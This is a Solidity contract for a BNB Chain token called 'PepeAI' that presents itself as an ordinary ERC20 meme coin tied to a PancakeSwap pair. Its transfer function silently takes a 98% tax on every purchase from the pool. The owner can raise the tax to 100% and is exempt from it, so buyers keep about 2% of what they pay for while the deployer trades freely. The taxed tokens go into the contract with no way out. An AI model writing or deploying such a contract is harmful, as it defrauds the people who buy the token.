pragma solidity ^0.8.0;

import "./utils/IERC20.sol";
import "./utils/Context.sol";
import "./utils/Ownable.sol";
import "./utils/IPancakeFactory.sol";

contract PepeAI is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 MAX_INT = 2 ** 256 - 1;

    // PancakeSwap factory
    // Mainnet: 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
    // Testnet: 0x6725F303b657a9451d8BA641348b6761A6CC7a17
    address public constant FACTORY =
        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    // WETH address
    // Mainnet: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    // Testnet: 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd
    address public constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // IDEXRouter public router;
    address public pool;

    // Define tax rates
    uint256 public taxPercent = 98;
    mapping(address => bool) private _isTaxExempt;

    function setTaxPercent(uint256 newTaxPercent) public onlyOwner {
        require(newTaxPercent <= 100, "Invalid tax percent");
        taxPercent = newTaxPercent;
    }

    function setTaxExempt(address account, bool exempt) public onlyOwner {
        _isTaxExempt[account] = exempt;
    }

    function isTaxExempt(address account) public view returns (bool) {
        return _isTaxExempt[account];
    }

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, 1000000 * 10 ** decimals());

        // Exempt the owner from taxes
        _isTaxExempt[msg.sender] = true;
        _isTaxExempt[address(this)] = true;

        pool = IPancakeFactory(FACTORY).createPair(address(this), WETH);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        uint256 taxAmount = 0;
        if (!_isTaxExempt[sender] && amount > 0) {
            // Buy transaction, apply tax
            if (sender == pool) {
                taxAmount = (amount * taxPercent) / 100;
            }
        }

        uint256 transferAmount = amount - taxAmount;

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += transferAmount;
        emit Transfer(sender, recipient, transferAmount);

        if (taxAmount > 0) {
            _balances[address(this)] += taxAmount;
            emit Transfer(sender, address(this), taxAmount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
